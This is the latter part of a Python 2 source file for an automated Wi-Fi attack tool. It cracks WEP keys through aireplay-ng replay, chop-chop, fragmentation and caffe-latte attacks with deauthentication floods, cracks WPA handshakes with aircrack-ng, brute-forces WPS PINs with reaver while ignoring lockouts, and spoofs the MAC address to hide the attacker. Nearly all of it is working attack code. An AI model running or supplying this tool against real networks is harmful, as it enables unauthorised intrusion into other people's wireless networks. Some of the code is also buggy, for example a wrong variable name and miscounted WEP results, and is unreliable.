	if not WEP_ARP_REPLAY: total_attacks -= 1
	if not WEP_CHOPCHOP:   total_attacks -= 1
	if not WEP_FRAGMENT:   total_attacks -= 1
	if not WEP_CAFFELATTE and len(clients) > 0: total_attacks -= 1
	
	if total_attacks <= 0:
		print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
		return False
	
	print ' %s attacking "%s" (%s)' % (sec_to_hms(WEP_TIMEOUT * total_attacks), \
	                                   G+target.ssid+W, G+target.bssid+W)
	
	remove_airodump_files('wep')
	remove_file(temp + 'wepkey.txt')
	
	# Start airodump process to capture packets
	cmd = ['airodump-ng',
	       '-w', temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
	       '-c', target.channel,    # Wireless channel
	       '--bssid', target.bssid,
	       iface]
	proc_airodump = Popen(cmd, stdout=DN, stderr=DN)
	
	successful       = False # Flag for when attack is successful
	started_cracking = False # Flag for when we have started aircrack-ng
	client_mac       = ''    # The client mac we will send packets to/from
	try:
		print ' %s attempting %sfake authentication%s...' % (sec_to_hms(WEP_TIMEOUT * total_attacks), G, W),
		if wep_fake_auth(iface, target): 
			print G+'successful!'+W
			client_mac = THIS_MAC
		else:
			print R+'failed!'+W
			if not WEP_IGNORE_FAKEAUTH: 
				send_interrupt(proc_aireplay)
				send_interrupt(proc_airodump)
				print R+' [!]'+O+' unable to fake-authenticate with target'
				print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
				return False
		
		ivs = 0
		last_ivs = 0
		for attack_num in xrange(0, 4):
			
			# Skip disabled attacks
			if   attack_num == 0 and not WEP_ARP_REPLAY: continue
			elif attack_num == 1 and not WEP_CHOPCHOP:   continue
			elif attack_num == 2 and not WEP_FRAGMENT:   continue
			elif attack_num == 3 and not WEP_CAFFELATTE: continue
			
			remove_file(temp + 'arp.cap')
			# Generate the aireplay-ng arguments based on attack_num and other params
			cmd = get_aireplay_command(iface, attack_num, target, clients, client_mac)
			if cmd == '': continue
			proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
			
			print ' %s attacking "%s" via' % (sec_to_hms(WEP_TIMEOUT * \
			                                (total_attacks - attack_num)), G+target.ssid+W),
			if attack_num == 0:   print G+'arp-replay',
			elif attack_num == 1: print G+'chop-chop',
			elif attack_num == 2: print G+'fragmentation',
			elif attack_num == 3: print G+'caffe-latte',
			print 'attack'+W
			
			time.sleep(1)
			if attack_num == 1:
				# Send a deauth packet to broadcast and all clients *just because!*
				wep_send_deauths(iface, target, clients)
			
			time_started = time.time()
			while time.time() - time_started < WEP_TIMEOUT:
				time.sleep(5)
				
				# Calculates total seconds remaining
				current_hms = sec_to_hms(WEP_TIMEOUT * (total_attacks - attack_num) - (time.time() - time_started))
				
				# Check number of IVs captured
				csv = parse_csv(temp + 'wep-01.csv')[0]
				if len(csv) > 0:
					ivs = int(csv[0].data)
					print " %s captured %s%d%s ivs, iv/sec: %s%d%s  \r" % (current_hms, G, ivs, W, G, (ivs - last_ivs) / 5, W),
					last_ivs = ivs
					stdout.flush()
					if ivs >= WEP_CRACK_AT_IVS and not started_cracking:
						# Start cracking
						cmd = ['aircrack-ng',
						       '-a', '1',
						       '-l', temp + 'wepkey.txt',
						       temp + 'wep-01.cap']
						print "\r %s starting %s (%sover %d ivs%s)" % (current_hms, G+'cracker'+W, G, WEP_CRACK_AT_IVS, W)
						proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
						started_cracking = True
				
				# Check if key has been cracked yet.
				if os.path.exists(temp + 'wepkey.txt'):
					# Cracked!
					infile = open(temp + 'wepkey.txt', 'r')
					key = infile.read().replace('\n', '')
					infile.close()
					print '\n\n %s %s %s (%s)! key: "%s"' % (current_hms, G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
					WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
					
					# Kill processes
					send_interrupt(proc_airodump)
					send_interrupt(proc_aireplay)
					send_interrupt(proc_aircrack)
					# Remove files generated by airodump/aireplay/packetforce
					remove_airodump_files('wep')
					remove_file(temp + 'wepkey.txt')
					return True
				
				# Check if aireplay is still executing
				if proc_aireplay.poll() == None: continue
				
				# At this point, aireplay has stopped
				if attack_num == 0 or attack_num == 3:
					print ' %s attack failed: %saireplay-ng quit during arp-replay/interactive%s' % (R+current_hms, O, W)
					break # Break out of attack's While loop
				
				# Check for a .XOR file (we expect one when doing chopchop/fragmentation
				xor_file = ''
				for filename in os.listdir(temp):
					if filename.lower().endswith('.xor'): xor_file = temp + filename
				if xor_file == '':
					print ' %s attack failed: %sunable to generate keystream%s' % (R+current_hms, O, W)
					break
				
				remove_file(temp + 'arp.cap')
				cmd = ['packetforge-ng',
					     '-arp',
					     '-a', targets.bssid,
					     '-h', client_mac,
					     '-k', '192.168.1.2',
					     '-l', '192.168.1.100',
					     '-y', xor_file,
					     '-w', temp + 'arp.cap',
					     iface]
				proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
				proc_pforge.wait()
				forged_packet = proc_pforge.communicate()[0]
				remove_file(xor_file)
				if forged_packet == None: result = ''
				forged_packet = forged_packet.strip()
				if not forged_packet.find('Wrote packet'):
					print " %s attack failed: unable to forget ARP packet." % (current_hms)
					break
				
				# We were able to forge a packet, so let's replay it via aireplay-ng
				cmd = ['aireplay-ng',
				       '--arpreplay',
				       '-r', temp + 'arp.cap', # Used the forged ARP packet
				       '-F', # Select the first packet
				       iface]
				proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
				
				print ' %s forged %s! %s...' % (current_hms, G+'arp packet'+W, G+'replaying'+W)
			
			
		# After the attacks, if we are already cracking, wait for the key to be found!
		while ivs > WEP_CRACK_AT_IVS:
			time.sleep(5)
			# Check number of IVs captured
			csv = parse_csv(temp + 'wep-01.csv')[0]
			if len(csv) > 0:
				ivs = int(csv[0].data)
				print " [endless] captured %s%d%s ivs, iv/sec: %s%d%s  \r" % (G, ivs, W, G, (ivs - last_ivs) / 5, W),
				last_ivs = ivs
				stdout.flush()
			
			# Check if key has been cracked yet.
			if os.path.exists(temp + 'wepkey.txt'):
				# Cracked!
				infile = open(temp + 'wepkey.txt', 'r')
				key = infile.read().replace('\n', '')
				infile.close()
				print '\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
				WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
				
				# Kill processes
				send_interrupt(proc_airodump)
				send_interrupt(proc_aireplay)
				send_interrupt(proc_aircrack)
				# Remove files generated by airodump/aireplay/packetforce
				remove_airodump_files('wep')
				remove_file(temp + 'wepkey.txt')
				return True
		
	except KeyboardInterrupt:
		print R+'\n (^C)'+O+' WEP attack interrupted'+W
	
	if successful:
		print '\n [0:00:00] attack completed: '+G+'success!'+W
	else:
		print '\n [0:00:00] attack completed: '+R+'failed'+W
	
	send_interrupt(proc_aireplay)
	send_interrupt(proc_airodump)
	
	# Remove files generated by airodump/aireplay/packetforce
	for filename in os.listdir('.'):
		if filename.startswith('replay_arp-') and filename.endswith('.cap'):
			remove_file(filename)
	remove_airodump_files('wep')
	remove_file(temp + 'wepkey.txt')
	
def send_interrupt(process):
	"""
		Sends interrupt signal to process's PID.
	"""
	try:
		os.kill(process.pid, SIGINT)
		# os.kill(process.pid, SIGTERM)
	except OSError: pass           # process cannot be killed
	except TypeError: pass         # pid is incorrect type
	except UnboundLocalError: pass # 'process' is not defined
	except AttributeError: pass    # Trying to kill "None"


def get_mac_address(iface):
	"""
		Returns MAC address of "iface".
	"""
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
	proc.wait()
	mac = ''
	first_line = proc.communicate()[0].split('\n')[0]
	for word in first_line.split(' '):
		if word != '': mac = word
	if mac.find('-') != -1: mac = mac.replace('-', ':')
	if len(mac) > 17: mac = mac[0:17]
	
	return mac


def main():
	"""
		Where the magic happens.
	"""
	global TARGETS_REMAINING, THIS_MAC
	
	# The "get_iface" method anonymizes the MAC address (if needed)
	# and puts the interface into monitor mode.
	iface = get_iface()
	
	THIS_MAC = get_mac_address(iface) # Store current MAC address
	
	(targets, clients) = scan(iface=iface)
	
	try:
		# Check if handshakes already exist, ask user whether to skip targets or save new handshakes
		for target in targets:
			handshake_file = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid+'_'+target.bssid) + '.cap'
			if os.path.exists(handshake_file):
				print R+'\n [!] '+O+'you already have a handshake file for %s:' % (C+target.ssid+W)
				print '        %s\n' % (G+handshake_file+W)
				print ' [+] do you want to '+G+'[s]kip'+W+', '+O+'[c]apture again'+W+', or '+R+'[o]verwrite'+W+'?'
				ri = raw_input(' [+] enter '+G+'s'+W+', '+O+'c,'+W+' or '+R+'o'+W+': '+G)
				print W+"\b",
				while ri != 's' and ri != 'c' and ri != 'o': pass
				if ri == 's': targets.remove(target)
				elif ri == 'o': remove_file(handshake_file)
	except KeyboardInterrupt:
		print ''
		exit_gracefully(0)
	
	wpa_success = 0
	wep_success = 0
	wpa_total   = 0
	wep_total   = 0
	
	TARGETS_REMAINING = len(targets)
	for t in targets:
		TARGETS_REMAINING -= 1
		
		# Build list of clients connected to target
		ts_clients = []
		for c in clients:
			if c.station == t.bssid:
				ts_clients.append(c)
		
		print ''
		if t.encryption.find('WPA') != -1:
			need_handshake = True
			if t.wps:
				need_handshake = not wps_attack(iface, t)
				wpa_total += 1
			
			if not WPA_HANDSHAKE_DISABLE and need_handshake:
				wpa_total += 1
				if wpa_get_handshake(iface, t, ts_clients):
					wpa_success += 1
			else:
				wpa_success += 1
			
		elif t.encryption.find('WEP') != -1:
			wep_total += 1
			if attack_wep(iface, t, ts_clients):
				wep_success += 1
		
		else: print R+' unknown encryption:',t.encryption,W
		
		# If user wants to stop attacking
		if TARGETS_REMAINING == 0: break
	
	if wpa_total + wep_total > 0:
		# Attacks are done! Show results to user
		print ''
		print ' [+] %s%d attack%s completed:%s' % (G, wpa_total + wep_total, '' if wpa_total+wep_total == 1 else 's', W)
		print ''
		if wpa_total > 0:
			if wpa_success == 0:           print ' [+]'+R,
			elif wpa_success == wpa_total: print ' [+]'+G,
			else:                          print ' [+]'+O,
			print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)
		
			for finding in WPA_FINDINGS:
				print '        ' + C+finding+W
		
		if wep_total > 0:
			print ' [+]',
			if wep_success == 0:           print R,
			elif wep_success == wep_total: print G,
			else:                          print O,
			print '%d/%d%s WEP attacks succeeded' % (wpa_success, wpa_total, W)
		
			for finding in WEP_FINDINGS:
				print '        ' + C+finding+W
	
		caps = len(WPA_CAPS_TO_CRACK)
		if caps > 0 and not WPA_DONT_CRACK:
			print ' beginning WPA crack on %d handshake%s' % (caps, '' if caps == 1 else 's')
			for cap in WPA_CAPS_TO_CRACK:
				wpa_crack(cap)
	
	print ''
	exit_gracefully(0)


def wpa_crack(capfile):
	"""
		Cracks cap file using aircrack-ng
		This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
		they can do so manually.
	"""
	print ' [0:00:00] cracking %s with %s' % (G+capfile.ssid+W, G+'aircrack-ng'+W)
	start_time = time.time()
	cracked = False
	
	remove_file(temp + 'out.out')
	remove_file(temp + 'wpakey.txt')
	
	cmd = ['aircrack-ng',
	       '-a', '2',                 # WPA crack
	       '-w', WPA_DICTIONARY,      # Wordlist
	       '-l', temp + 'wpakey.txt', # Save key to file
	       capfile.filename]
	proc = Popen(cmd, stdout=open(temp + 'out.out', 'a'), stderr=DN)
	try:
		kt  = 0 # Keys tested
		kps = 0 # Keys per second
		while True: 
			time.sleep(1)
			
			if proc.poll() != None: # aircrack stopped
				if os.path.exists(temp + 'wpakey.txt'):
					# Cracked
					inf = open(temp + 'wpakey.txt')
					key = inf.read().strip()
					inf.close()
					WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W))
					print '\n [+] cracked %s (%s): "%s"\n' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W)
					cracked = True
				else:
					# Did not crack
					print '\n [+] crack attempt '+R+'failed'+W+''
				break
			
			inf = open(temp + 'out.out', 'r')
			lines = inf.read().split('\n')
			inf.close()
			outf = open(temp + 'out.out', 'w')
			outf.close()
			for line in lines:
				i = line.find(']')
				j = line.find('keys tested', i)
				if i != -1 and j != -1:
					kts = line[i+2:j-1]
					try: kt = int(kts)
					except ValueError: pass
				i = line.find('(')
				j = line.find('k/s)', i)
				if i != -1 and j != -1:
					kpss = line[i+1:j-1]
					try: kps = float(kpss)
					except ValueError: pass
			
			print "\r %s keys tested: %d (%.2f keys/sec)   " % \
			             (sec_to_hms(time.time() - start_time), kt, kps),
			stdout.flush()
			
	except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W
	
	send_interrupt(proc)
	try: os.kill(proc.pid, SIGTERM)
	except OSError: pass
	
	return cracked


def wps_attack(iface, target):
	"""
		Mounts attack against target on iface.
		Uses "reaver" to attempt to brute force the PIN.
		Once PIN is found, PSK can be recovered.
		PSK is displayed to user and added to WPS_FINDINGS
	"""
	if not program_exists('reaver'):
		print R+' [!]'+O+' the program '+G+'reaver'+O+' is required for WPS attacks'+W
		print ' [!] you can download reaver at:'
		print C+'        http://code.google.com/p/reaver-wps/'
		return False
	
	print GR+' [0:00:00]'+W+' initializing %sWPS-brute force attack%s against %s' % (G, W, G+target.ssid+W)
	
	cmd = ['reaver',
	       '-i', iface,
	       '-b', target.bssid,
	       '-o', temp + 'out.out',
	       '-a',  # auto-detect best options
	       '--ignore-locks',
	       '-vv']  # semi-verbose output
	proc = Popen(cmd, stdout=DN, stderr=DN)
	cracked = False
	percent = 'x.xx'
	aps = 'x'
	time_started = time.time()
	try:
		while not cracked:
			time.sleep(1)
			
			if os.path.exists(temp + 'out.out'):
				inf = open(temp + 'out.out', 'r')
				lines = inf.read().split('\n')
				inf.close()
				for line in lines:
					if line.find(' complete @ ') != -1 and len(line) > 8:
						percent = line[4:8]
						i = line.find(' (')
						j = line.find(' seconds/attempt', i)
						if i != -1 and j != -1: aps = line[i+2:j]
				print ' %s brute-forcing WPS pin via %s, %s%% (%s sec/try)    \r' % \
				            (GR+sec_to_hms(time.time()-time_started)+W, \
				            G+'reaver'+W, G+percent+W, G+aps+W),
				stdout.flush()
			
			if proc.poll() != None:
				# Cracked? Failed? 
				inf = open(temp + 'out.out', 'r')
				lines = inf.read().split('\n')
				inf.close()
				pin = ''
				key = ''
				for line in lines:
					# When it's cracked:
					if line.find("[+] WPS PIN: '") != -1:
						pin = line[14:-1]
					if line.find("[+] WPA PSK: '") != -1:
						key = line[14:-1]
						cracked = True
				
				if pin != '': print '\n\n [+] PIN found:     %s' % (G+pin+W)
				if key != '': print ' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
				break
		
		if cracked:
			WPA_FINDINGS.append("found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, pin))
		
	except KeyboardInterrupt:
		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
	
	return cracked

def generate_random_mac(old_mac):
	"""
		Generates a random MAC address.
		Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
		Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
	"""
	random.seed()
	new_mac = old_mac[:8].lower().replace('-', ':')
	for i in xrange(0, 6):
		if i % 2 == 0: new_mac += ':'
		new_mac += '0123456789abcdef'[random.randint(0,15)]
	
	# Prevent generating the same MAC address via recursion.
	if new_mac == old_mac:
		new_mac = generate_random_mac(old_mac)
	return new_mac

def mac_anonymize(iface):
	"""
		Changes MAC address of 'iface' to a random MAC.
		Only randomizes the last 6 digits of the MAC, so the vender says the same.
		Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
	"""
	global ORIGINAL_IFACE_MAC
	if DO_NOT_CHANGE_MAC: return
	if not program_exists('ifconfig'): return
	
	# Store old (current) MAC address
	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
	proc.wait()
	for word in proc.communicate()[0].split('\n')[0].split(' '):
		if word != '': old_mac = word
	ORIGINAL_IFACE_MAC = (iface, old_mac)
	
	new_mac = generate_random_mac(old_mac)
	
	call(['ifconfig', iface, 'down'])
	
	print " [+] changing %s's MAC from %s to %s..." % (G+iface+W, G+old_mac+W, O+new_mac+W),
	stdout.flush()
	
	proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	print 'done'

def mac_change_back():
	"""
		Changes MAC address back to what it was before attacks began.
	"""
	iface = ORIGINAL_IFACE_MAC[0]
	old_mac = ORIGINAL_IFACE_MAC[1]
	if iface == '' or old_mac == '': return
	
	print " [+] changing %s's mac back to %s..." % (G+iface+W, G+old_mac+W),
	stdout.flush()
	
	call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
	proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=DN)
	proc.wait()
	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
	print "done"

def exit_gracefully(code):
	"""
		We may exit the program at any time.
		We want to remove the temp folder and any files contained within it.
		Removes the temp files/folder and exists with error code "code".
	"""
	# Remove temp files and folder
	for file in os.listdir(temp):
		os.remove(temp + file)
	os.rmdir(temp)
	# Disable monitor mode if enabled by us
	disable_monitor_mode()
	# Change MAC address back if spoofed
	mac_change_back()
	print W+" [+] the program will now exit"
	# GTFO
	exit(code)

#t = Target('c0:c1:c0:07:54:dc', '1', '1', '6', 'WPA', 'Killfuck Soulshitter')
#print has_handshake(t, 'wpa-01.cap')
#exit_gracefully(1)

#c = CapFile('wpa-01.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
#WPA_CRACKER = 'aircrack'
#cracked = wpa_crack(c)
#print cracked
#exit_gracefully(1)


if __name__ == '__main__':
	try:
		handle_args()
		main()
	except KeyboardInterrupt:
		print R+'\n (^C)'+O+' interrupted'+W
	exit_gracefully(0)

